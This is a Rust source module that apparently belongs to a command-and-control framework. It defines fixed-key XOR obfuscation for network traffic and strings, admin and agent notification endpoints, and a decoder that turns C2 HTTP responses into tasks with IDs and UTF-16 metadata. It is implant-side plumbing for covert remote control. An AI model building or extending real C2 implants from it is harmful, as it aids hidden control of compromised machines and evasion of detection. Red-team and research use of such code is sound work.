use crate::tasks::{Command, Task};

const NET_XOR_KEY: u8 = 0x3d;
pub const STR_CRYPT_XOR_KEY: u8 = 0x1f;

pub const ADMIN_ENDPOINT: &str = "admin";
/// The API endpoint for whether an unread notification exists for a specific agent
pub const NOTIFICATION_CHECK_AGENT_ENDPOINT: &str = "check_notifs";

pub type CompletedTasks = Vec<Vec<u16>>;
pub type TasksNetworkStream = Vec<Vec<u8>>;

pub trait XorEncode {
    fn xor_network_stream(self) -> Self;
}

pub trait CommandHeader {
    fn from_command(cmd: Command) -> Self;
}

impl CommandHeader for Vec<u16> {
    fn from_command(c: Command) -> Self {
        let mut header = Self::new();

        let (low, high) = c.to_u16_tuple_le();
        header.push(low);
        header.push(high);

        header
    }
}

impl XorEncode for Vec<u8> {
    fn xor_network_stream(mut self) -> Self {
        for b in &mut self {
            *b ^= NET_XOR_KEY;
        }

        self
    }
}

pub fn encode_u16buf_to_u8buf(input: &[u16]) -> Vec<u8> {
    let mut buf: Vec<u8> = Vec::with_capacity(input.len());

    for word in input.iter() {
        let [lo, hi] = word.to_le_bytes();
        buf.push(lo);
        buf.push(hi);
    }

    buf
}

pub fn decode_u8buf_to_u16buf(input: &[u8]) -> Vec<u16> {
    let mut u16_bytes: Vec<u16> = Vec::with_capacity(input.len());

    for chunk in input.chunks_exact(2) {
        let lo = chunk[0];
        let hi = chunk[1];
        let word = u16::from_le_bytes([lo, hi]);
        u16_bytes.push(word);
    }

    u16_bytes
}

pub fn decode_http_response(byte_response: &[u8]) -> Task {
    let command_buf = &byte_response[..4];
    let mut command_int: u32 = 0;

    //
    // First we want to construct the command, we will first pull the u32 out of the message,
    // and construct a `Command` from it.
    //
    for (i, byte) in command_buf.iter().enumerate() {
        command_int |= (*byte as u32) << (8 * i);
    }

    let command = Command::from_u32(command_int);

    //
    // Now pull out the Task ID which we can send back to the  C2 in order to mark the task as
    // completed in the database.
    //
    let end = byte_response.len() - 4;
    let id_bytes: &[u8] = &byte_response[end..];
    let task_id = i32::from_le_bytes([id_bytes[0], id_bytes[1], id_bytes[2], id_bytes[3]]);

    // Check if there was a message attached or not (> 8 bytes)
    if byte_response.len() == 8 {
        return Task {
            id: task_id,
            command,
            metadata: None,
            completed_time: None,
        };
    }

    //
    // We now know there is a message present, so we can pull it out of the u8 vec by
    // converting it to a utf-16 string.
    //

    // Calculate the actual size of the message, -4 for the tail which contains the task ID
    let message_sz = byte_response.len() - 4;
    let message_bytes = &byte_response[4..message_sz];
    let u16_bytes = decode_u8buf_to_u16buf(message_bytes);
    let task_metadata_string = String::from_utf16_lossy(&u16_bytes);

    Task {
        id: task_id,
        command,
        metadata: Some(task_metadata_string),
        completed_time: None,
    }
}
